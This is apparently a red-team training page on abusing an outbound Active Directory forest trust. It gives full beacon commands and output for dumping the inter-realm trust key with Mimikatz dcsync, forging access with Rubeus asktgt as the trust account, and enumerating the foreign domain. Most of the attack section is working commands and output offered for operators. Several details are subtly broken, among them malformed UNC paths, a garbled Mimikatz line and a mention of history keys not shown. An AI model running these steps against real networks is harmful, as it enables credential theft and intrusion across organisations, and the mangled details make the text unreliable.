---
title: "Cross-Forest Domain Relationships (Outbound Trusts)"
date: 2026-09-25
weight: 3
type: docs
tags:
  - Active Directory
  - Forest & Domain Trusts
---

An operator may occasionally operate from the trusting side of a unidirectional trust relationship, commonly known as an outbound trust path. In this posture, the active session operates against the designated direction of resource allocation, meaning the external forest functions as a strict security boundary that denies access from the local environment by design.

Evaluating local configuration metrics via a Trusted Domain Object (TDO) query reveals an outbound unidirectional connection path established with the external target `alliance-corp.com`.

```powershell
beacon> getuid
[*] You are ARCADIA\operator.user

beacon> ldapsearch (objectClass=trustedDomain)

name: alliance-corp.com
trustDirection: 2
trustAttributes: 8
flatName: ALLIANCE
```

Directly attempting standard directory discovery queries against the external domain infrastructure typically drops with LDAP error code `49` (Invalid Credentials). This boundary control blocks standard unauthorized enumeration techniques across the link.

```powershell
beacon> ldapsearch (objectClass=domain) --dn DC=alliance,DC=corp --attributes name,objectSid --hostname alliance-corp.com

Binding to alliance-corp.com
[-] Bind Failed: 49
```

Under the hood, routing a cross-boundary service request (`TGS-REQ`) for `krbtgt/ALLIANCE-CORP.COM` against the local domain controller prompts a `KDC_ERR_S_PRINCIPAL_UNKNOWN` rejection. Because the local infrastructure container does not manage foreign service profiles, it denies processing and drops referral execution flows.

However, if an operator captures valid authentication material for any legitimate security principal bound to the trusted foreign environment, they can establish a remote token session to execute transactions directly against the foreign forest's domain controllers.

```powershell
beacon> make_token ALLIANCE\DomainUser Passw0rd123!
[+] Impersonated ALLIANCE\DomainUser (netonly)

beacon> ls \\://alliance-corp.com\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     01/24/2025 13:33:39   $Recycle.Bin
          dir     01/24/2025 13:33:21   Users
          dir     01/24/2025 13:49:56   Windows
```

## Extracting Trust Inter-Realm Keys

To establish an unauthenticated foothold inside the foreign trusted tier, operators can pivot through the specialized trust account profile generated inside the foreign forest. Recall that the foreign domain generates a trust identity tracking the flat name of the local domain; the baseline password for this account maps directly to the synchronized inter-realm trust key. Because the local domain maintains a persistent record of this shared cryptographic secret inside the TDO configuration partition, operators can query it locally.

First, identify the targeted directory partition metadata by isolating the TDO's unique `objectGUID` property.

```powershell
beacon> ldapsearch (objectClass=trustedDomain) --attributes name,objectGUID

--------------------
name: alliance-corp.com
objectGUID: 288d9ee6-2b3c-42aa-bef8-959ab4e484ed
```

Next, issue a specialized `dcsync` query utilizing Mimikatz's targeted `/guid` extraction filter to unwrap the underlying configuration parameters.

```powershell
beacon> mimikatz lsadump::dcsync /domain:arcadia.local /guid:{288d9ee6-2b3c-42aa-bef8-959ab4e484ed}

[DC] 'arcadia.local' will be the domain
[DC] 'dc-1.arcadia.local' will be the DC server
[DC] Object with GUID '{288d9ee6-2b3c-42aa-bef8-959ab4e484ed}'
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : alliance-corp.com

** TRUSTED DOMAIN - Antisocial **

Partner              : alliance-corp.com
 [ Out ] ALLIANCE-CORP.COM -> ARCADIA.LOCAL
    * 14/03/2025 10:27:30 - CLEAR   - cb 87 71 2c 62 c1 2e 70 ae d8 29 5e 6a ae 8c a9 96 39 51 39 10 3a ef 7c 42 6d 2d 97 
	* aes256_hmac       cc19dd9022fb33da79820c340e7c96765f237aa1a5a9dfe889a8f27af12c7a34
	* aes128_hmac       4929a44176077b570d1b6f1eae4f9fbb
	* rc4_hmac_nt       6150491cceb080dffeaaec5e60d8f58d
```

The output highlights current (`[Out]`) and history-tier (`[Out-1]`) credential sets. Utilizing the extracted legacy RC4 cipher key, operators can construct an Authentication Service Request (`AS-REQ`) to demand a valid TGT directly from the foreign realm's authentication architecture.

```powershell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:ARCADIA$ /domain:ALLIANCE-CORP.COM /dc:://alliance-corp.com /rc4:6150491cceb080dffeaaec5e60d8f58d /nowrap

[*] Action: Ask TGT

[*] Using rc4_hmac hash: 6150491cceb080dffeaaec5e60d8f58d
[*] Building AS-REQ (w/ preauth) for: 'ALLIANCE-CORP.COM\ARCADIA$'
[*] Using domain controller: 10.10.10.11:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFZ[...snip...]kNPTQ==

  ServiceName              :  krbtgt/ALLIANCE-CORP.COM
  ServiceRealm             :  ALLIANCE-CORP.COM
  UserName                 :  ARCADIA$ (NT_PRINCIPAL)
  UserRealm                :  ALLIANCE-CORP.COM
  StartTime                :  18/03/2025 13:58:52
  EndTime                  :  18/03/2025 23:58:52
  RenewTill                :  25/03/2025 13:58:52
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
```

## Traversing the Trust Boundary

Injecting this generated ticket payload into a working token context establishes a stable authentication session, granting read access across the external forest directory structures.

```powershell
beacon> run klist

Current LogonId is 0:0x23da426

Cached Tickets: (1)

#0>	Client: ARCADIA$ @ ALLIANCE-CORP.COM
	Server: krbtgt/ALLIANCE-CORP.COM @ ALLIANCE-CORP.COM
	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
	Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize 
	Session Key Type: RSADSI RC4-HMAC(NT)

beacon> ldapsearch (objectClass=domain) --dn DC=alliance,DC=corp --attributes name,objectSid --hostname alliance-corp.com

Binding to alliance-corp.com

[*] Distinguished name: DC=alliance,DC=corp
[*] Filter: (objectClass=domain)
[*] Scope of search value: 3
[*] Returning specific attribute(s): name,objectSid

--------------------
name: alliance-corp
objectSid: S-1-5-21-9988776655-1122334455-555555555
retreived 1 results total
```

This interaction is permitted because trust account profiles are assigned a baseline `primaryGroupID` configuration of `513` (Domain Users). This group association maps standard domain query rights directly to the session token context without requiring explicit membership inside the target container, a behavioral property rooted in legacy POSIX compatibility constraints. 

Once this foothold is verified, operators can perform systematic discovery routines within the foreign domain to find vulnerable service exposures, target Active Directory Certificate Services (ADCS) implementations, or look for roastable service accounts.
